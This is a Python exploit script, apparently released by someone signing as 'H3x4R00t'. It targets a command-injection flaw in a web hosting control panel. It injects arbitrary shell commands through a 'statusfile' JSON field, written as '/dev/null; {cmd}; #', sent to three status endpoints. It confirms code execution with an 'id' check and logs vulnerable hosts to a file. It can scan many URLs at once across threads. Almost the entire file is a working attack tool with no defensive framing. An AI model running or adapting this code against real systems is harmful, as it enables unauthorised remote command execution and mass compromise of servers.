import argparse
import concurrent.futures
import json
import logging
import re
import sys

import httpx


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)


banner = r"""

██╗  ██╗██████╗ ██╗  ██╗██╗  ██╗    ██████╗  ██████╗  ██████╗ ████████╗
██║  ██║╚════██╗╚██╗██╔╝██║  ██║    ██╔══██╗██╔═████╗██╔═████╗╚══██╔══╝
███████║ █████╔╝ ╚███╔╝ ███████║    ██████╔╝██║██╔██║██║██╔██║   ██║   
██╔══██║ ╚═══██╗ ██╔██╗ ╚════██║    ██╔══██╗████╔╝██║████╔╝██║   ██║   
██║  ██║██████╔╝██╔╝ ██╗     ██║    ██║  ██║╚██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
                                                                       

Telegram : @H3x4R00t
"""


def get_CSRF_token(client):
    try:
        resp = client.get("/")
        resp.raise_for_status()

        csrf_token = resp.cookies.get("csrftoken")

        if not csrf_token:
            logging.error("CSRF token not found in cookies.")

        return csrf_token

    except httpx.RequestError as e:
        logging.error(f"Error connecting to target: {e}")
        return None


def pwn(client, csrf_token, cmd):
    headers = {
        "X-CSRFToken": csrf_token,
        "Content-Type": "application/json",
        "Referer": str(client.base_url),
    }

    payload = json.dumps(
        {
            "statusfile": f"/dev/null; {cmd}; #",
            "csrftoken": csrf_token,
        }
    )

    endpoints = [
        "/dataBases/upgrademysqlstatus",
        "/ftp/getresetstatus",
        "/dns/getresetstatus",
    ]

    successful_output = []

    for endpoint in endpoints:
        try:
            response = client.put(
                endpoint,
                headers=headers,
                data=payload,
            )

            if response.status_code == 500:
                logging.error(
                    f"Server error 500: Internal Server Error at {endpoint}."
                )
                continue

            if response.status_code == 404:
                logging.error(
                    f"Error: Endpoint '{endpoint}' not found."
                )
                continue

            response.raise_for_status()

            try:
                response_data = response.json()

                logging.info(
                    f"Command output received from the server at {endpoint}:"
                )

                output = response_data.get(
                    "requestStatus",
                    "No 'requestStatus' in response",
                )

                logging.info(output)
                successful_output.append((endpoint, output))

            except ValueError:
                logging.error("Failed to parse JSON response.")

        except httpx.HTTPStatusError as e:
            logging.error(
                f"HTTP error at {endpoint}: "
                f"{e.response.status_code} - "
                f"{e.response.reason_phrase}"
            )

        except httpx.RequestError as e:
            logging.error(
                f"Request error during exploit at {endpoint}: {e}"
            )

    if successful_output:
        for endpoint, output in successful_output:
            logging.info(
                f"Command Output at {endpoint}:\n{output}"
            )

        return successful_output

    return "No successful response from any endpoint."


def exploit(client, cmd):
    csrf_token = get_CSRF_token(client)

    if not csrf_token:
        logging.error("Failed to retrieve CSRF token.")
        return

    stdout = pwn(client, csrf_token, cmd)

    if stdout:
        logging.info(f"Command Output:\n{stdout}")
        return stdout


def scan_url(url, cmd):
    if not url.startswith("http"):
        url = f"https://{url}"

    with httpx.Client(
        base_url=url,
        verify=False,
        follow_redirects=False,
        timeout=5,
    ) as client:
        logging.info(
            f"Scanning {url} with command: {cmd}"
        )

        result = exploit(client, cmd)

        regex = r"uid=\d+\(.*?\) gid=\d+\(.*?\) groups=.*?"

        if result and isinstance(result, list):
            for endpoint, output in result:
                match = re.search(regex, output)

                if match:
                    logging.info(
                        f"Vulnerable URL found at {url}{endpoint}"
                    )

                    with open("vuln.txt", "a") as vuln_file:
                        vuln_file.write(
                            url + endpoint + "\n"
                        )
        else:
            logging.info(
                f"No vulnerabilities found in {url} "
                f"or no output returned."
            )


def scan_urls_from_file(file_path, cmd, threads):
    with open(file_path, "r") as file:
        urls = [
            line.strip()
            for line in file
            if line.strip()
        ]

    with concurrent.futures.ThreadPoolExecutor(
        max_workers=threads
    ) as executor:

        futures = {
            executor.submit(scan_url, url, cmd): url
            for url in urls
        }

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()

            except Exception as e:
                logging.error(
                    f"Error processing "
                    f"{futures[future]}: {e}"
                )


if __name__ == "__main__":
    print(banner)

    parser = argparse.ArgumentParser(
        description="Exploit command injection vulnerability."
    )

    parser.add_argument(
        "--file",
        type=str,
        help="Path to the file containing URLs to scan.",
    )

    parser.add_argument(
        "--url",
        "--u",
        type=str,
        help="Single URL to scan.",
    )

    parser.add_argument(
        "--command",
        type=str,
        default="id",
        help="Command to execute on the target URLs "
             "(default: id).",
    )

    parser.add_argument(
        "--threads",
        "-t",
        type=int,
        default=10,
        help="Number of threads to use for scanning "
             "(default: 10).",
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Timeout for each request in seconds "
             "(default: 5).",
    )

    args = parser.parse_args()

    if args.url:
        scan_url(args.url, args.command)

    elif args.file:
        scan_urls_from_file(
            args.file,
            args.command,
            args.threads,
        )

    else:
        print(
            "Usage: python main.py "
            "--file <list.txt> "
            "[--url <url>] "
            "[--command <command>] "
            "[--threads <number>] "
            "[--timeout <seconds>]"
        )

        print("\nArguments:")
        print(
            "  --file <list.txt>   : "
            "Path to the file containing URLs to scan."
        )
        print(
            "  --url <url>         : "
            "A single URL to scan."
        )
        print(
            "  --command <command> : "
            "Command to execute on the target URLs "
            "(default: id)."
        )
        print(
            "  --threads <number>  : "
            "Number of threads to use for scanning "
            "(default: 10)."
        )
        print(
            "  --timeout <seconds> : "
            "Timeout for each request in seconds "
            "(default: 5)."
        )

        sys.exit(1)
